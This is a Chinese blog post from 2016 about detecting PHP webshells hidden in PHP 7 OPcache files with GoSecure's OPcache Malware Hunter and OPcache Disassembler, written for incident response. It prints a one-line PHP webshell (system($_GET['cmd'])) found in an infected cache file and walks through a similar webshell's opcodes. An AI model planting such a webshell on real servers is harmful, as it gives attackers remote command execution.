title: 在php opcache检测隐藏的后门程序
date: 2016-05-27 16:44:32
tags:
- Blogs
- php
categories:
- Blogs
---

文章是来自于前段时间发现Opcache可以构造php webshell的作者博客。

from [http://blog.gosecure.ca/2016/05/26/detecting-hidden-backdoors-in-php-opcache/](http://blog.gosecure.ca/2016/05/26/detecting-hidden-backdoors-in-php-opcache/)

本文讲的是怎么检测和分析隐藏在opcache中的恶意文件，在阅读这篇文章之前，你需要明白关于上次文章提到的利用php7 的 opcache构造webshell的利用方法。
原文[http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/](http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/)

wooyun的翻译[http://drops.wooyun.org/web/15450](http://drops.wooyun.org/web/15450)

<!--more-->

# 脚本 #

![PHP executing the malicious OpCache first](/img/php/confoo_cache_opcode.png)

在上一篇文章中，我们发现可以通过这样的方式，隐藏opcache内部的恶意文件。在实际环境中，当web服务器已经被入侵，我们可以能很难找到受到感染的opcache文件。由于目前的大多数文件都是通过扫描源文件的代码来判断是否存在webshell的，由于opcache的特殊性，恶意文件的研究人员和事件响应团队难以分析。

基于这种目的，我们开发了两个工具，以帮助找到并理解opcache文件中隐藏的后门
[https://github.com/GoSecure/php7-opcache-override](https://github.com/GoSecure/php7-opcache-override)

## 1. OPcache Malware Hunter ##

正如我们前面提到的，目前的工具大多都是通过检测源文件来判断php的恶意文件。如果出现了事件响应小组不知道攻击来自何方的情况，我们需要一个有效的方式来判断opcache是不是受到了感染。我们创建了OPcache Malware Hunter来发现可能受到感染的opcache文件

```
$ ./opcache_malware_hunt.py
Usage : ./opcache_malware_hunt.py [opcache_folder] [system_id] [php.ini]
```

OPcache Malware Hunter需要提供缓存目录和**system_id**，并用它来确定相应的源代码位置。该工具根据php.ini中的设置编译自己的opcache文件，通过比对和现有缓存文件的差异来判断是否发生了任何更改，无论多么模糊的文件内容都会被发现。

下面是OPcache Malware Hunter产生缓存文件和现有的缓存文件
![OPcache Malware Hunter](/img/php/Screen-Shot-2016-05-16-at-10.44.34-AM-700x123.png)

如果发现了潜在的受感染文件，OPcache Malware Hunter会生成一个包含更多信息的html报告
![Potentially infected files](/img/php/Screen-Shot-2016-05-16-at-10.48.49-AM-700x119.png)

该文件在生成的hunt_report文件夹下的index.html
![](/img/php/index-700x125.png)

点开任意一项都能看到原始文件和潜在受感染文件的差异报告

![Example report](/img/php/diff-700x283.png)

在图中，我们可以看到左边列表表示原来的缓存文件，右边裂变表示当前的缓存文件。我们可以看到，我们的缓存文件已经被替换成了一个webshell。
```
<?php 
system($_GET['cmd'])
?>

```
需要注意的是，OPcache Malware Hunter被设计为必须访问这些缓存文件、源文件、和服务器环境相同配置的php.ini，这样才能成功的检测出差异。

## 2. OPcache Disassembler ##

反汇编在恶意软件的分析中是非常有用的，opcache文件基本上是对应的源代码的字节码，类似于java和python的字节码。由于opcache文件的特性，似乎需要一个专用的反汇编器，帮助分析在袭击后恶意代码的行为。

### How It Works ###

OPcache Disassembler提供了两种显示选项，语法树和伪代码。
```
$ ./opcache_disassembler.py
Usage : ./opcache_disassembler.py [-tc] [file]
    -t Print syntax tree
    -c Print pseudocode
```

语法树提供了调用顺序的每一个操作码、函数和类的层次结构视图。然后，每个操作码被分为3个部分（操作数1、操作数2、结果）

![Syntax tree extract](/img/php/Screen-Shot-2016-05-03-at-3.14.01-PM-300x178.png)

尽管语法树的视图提供了一些资料，显示伪代码让事情变得更易读。对于同一个文件-c会更友好

![Pseudocode extract](/img/php/Screen-Shot-2016-05-04-at-10.16.53-AM-300x42.png)

在[官方文档](http://php.net/manual/en/internals2.opcodes.php)的帮助下，阅读操作码的意义不大。比起这个，伪代码更容易理解，在这里我们看到_GET变量并使用了'test'。那么我们猜测源代码可能是`isset($_GET['test'])`。

对于包含函数和类的opcache文件，反汇编器输出php语法来提高可读性，甚至还有语法高亮

![Disassembled classes and functions](/img/php/Screen-Shot-2016-05-04-at-3.58.47-PM-700x646.png)

在对于恶意软件的分析，我们可以用这个工具大致重现一下原来php文件的样子。另外，在上述反汇编代码，7-13行就是用于webshell的操作码

- 7-9行驶把$_GET['test']赋给!1
- 10行有个条件判断，如果没有满足跳到15行
- 11-13行调用系统!1

下面就是源代码，我们可以看到最后两行是webshell

![Original Source Code](/img/php/Screen-Shot-2016-05-04-at-3.57.11-PM-700x383.png)

# 结论 #

The disassembler and malware hunter 在我们web服务器中分析opcache的webshell非常好用，在受到攻击的情况下，这些工具可以检测违反的来源，并发现这些恶意文件是如何运作的...

# 参考 #

[PHP Malware Finder](https://github.com/nbs-system/php-malware-finder) by NBS System
[PHP Backdoor Obfuscation Techniques](https://vexatioustendencies.com/php-backdoor-obfuscation-techniques/) by Voxel@Night
[Understanding Opcodes](http://blog.golemon.com/2008/01/understanding-opcodes.html) by Sara Golemon
[Zend Engine 2 Opcodes](http://php.net/manual/en/internals2.opcodes.php) PHP Official Documentation